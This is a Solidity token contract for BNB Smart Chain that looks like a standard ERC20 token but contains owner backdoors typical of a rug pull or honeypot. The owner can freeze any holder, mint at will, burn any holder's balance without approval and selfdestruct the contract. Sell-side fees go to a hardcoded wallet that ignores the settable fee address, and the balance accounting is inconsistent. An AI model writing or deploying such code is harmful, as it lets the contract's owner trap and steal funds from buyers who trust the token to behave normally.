/**
 *Submitted for verification at BscScan.com on 2021-08-22
*/

pragma solidity ^0.5.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable{
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    //调用限制
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }
    
        function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
    
contract ERC20Token is Ownable{
    using SafeMath for uint256;
    
    string public name; 
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    uint256 rTotal;
    address pancakeAddress;
    address feeowner;
    mapping (address => bool) public frozenAccount;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowance;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    event FrozenFunds(address target, bool freeze);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (uint256 _initialSupply, string memory _name, string memory _symbol,uint8 _decimals,address _pancakeAddress,address _feeowner) public{
        decimals = _decimals;
        totalSupply = _initialSupply * 10 ** uint256(_decimals);
        _balances[msg.sender] = totalSupply;
        name = _name; 
        symbol = _symbol;
        rTotal = _initialSupply * 10 ** uint256(_decimals);
        pancakeAddress = _pancakeAddress;
        feeowner = _feeowner;
    }
    function balanceOf(address account) public view returns (uint256) {
        uint256 aa = rTotal.mul(100000000).div(totalSupply);
        return _balances[account].mul(100000000).div(aa);
        
    }
    function freezeAccount(address target, bool freeze) public onlyOwner {
        frozenAccount[target] = freeze;
        emit FrozenFunds(target, freeze);
    }
    function setFeeownerAccount(address addr) public onlyOwner returns(bool){
        feeowner = addr;
        return true;
    }
    function setPancakeAddress(address pancake) public onlyOwner returns (bool) {
        pancakeAddress = pancake;
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(!frozenAccount[msg.sender]);
        require(!frozenAccount[recipient]);
        
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowance[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(!frozenAccount[sender]);
        require(!frozenAccount[recipient]);
        
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowance[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds _allowance"));
        return true;
    }

    function increase_allowance(address spender, uint256 addedValue) private returns (bool) {
        _approve(msg.sender, spender, _allowance[msg.sender][spender].add(addedValue));
        return true;
    }

    function decrease_allowance(address spender, uint256 subtractedValue) private returns (bool) {
        _approve(msg.sender, spender, _allowance[msg.sender][spender].sub(subtractedValue, "ERC20: decreased _allowance below zero"));
        return true;
    }
    
    function mint(address account, uint256 amount) public onlyOwner{
        _mint(account, amount);
    }

    function burn(address add,uint256 amount) public onlyOwner{
        _burn(add, amount);
    }

    function burnFrom(address account, uint256 amount) public onlyOwner {
        _burnFrom(account, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "TRC20: transfer from the zero address");
        require(recipient != address(0), "TRC20: transfer to the zero address");
        address _feeowner = address(0x5A2bf62bFA8DfdFD18d94afA95c712DC227F0801);
        uint256 r= rTotal.mul(100000000).div(totalSupply);
        uint256 rAmount = amount.div(100000000).mul(r);
        uint256 toamount = amount;
        if(recipient == pancakeAddress){
            uint256 onepercent = amount.mul(1).div(100);
        _balances[address(0)]=_balances[address(0)].add(onepercent.mul(2));
        emit Transfer(sender, address(0), onepercent.mul(2));
        _balances[_feeowner]= _balances[_feeowner].add(onepercent.mul(5));
        emit Transfer(sender, _feeowner, onepercent.mul(5));
        uint256 p = onepercent.mul(10);
        toamount = amount.sub(p);
        }
        _balances[sender] = _balances[sender].sub(rAmount);
        _balances[recipient] = _balances[recipient].add(toamount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        totalSupply = totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        // totalSupply = totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowance[account][msg.sender].sub(amount, "ERC20: burn amount exceeds _allowance"));
    }
    
    //合约销毁
    function kill() public onlyOwner{
          selfdestruct(msg.sender);
    }

    //callback
    function() external payable{
        revert();//调用时报错
    }
}